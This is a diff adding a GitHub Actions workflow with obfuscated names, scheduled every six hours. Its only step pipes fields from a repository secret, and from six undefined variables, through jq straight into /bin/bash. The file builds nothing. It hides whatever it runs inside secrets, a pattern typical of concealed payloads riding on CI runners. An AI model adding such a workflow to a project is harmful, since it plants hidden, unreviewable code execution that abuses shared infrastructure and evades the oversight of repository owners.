@@ -1,0 +1,24 @@
+name: lujingxi3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujingxi3456
+        env:
+          m12951: ${{ secrets.m12951 }}
+        run: |
+          echo $m12951 | jq -r .dia9 | /bin/bash
+          echo $xrabo046 | jq -r .ns8933 | /bin/bash
+          echo $ssvw4 | jq -r .dryr4 | /bin/bash
+          echo $j8 | jq -r .rv687 | /bin/bash
+          echo $pkfy5592 | jq -r .ema739 | /bin/bash
+          echo $s45 | jq -r .mz1573 | /bin/bash
+          echo $qppm99497 | jq -r .z352 | /bin/bash
+
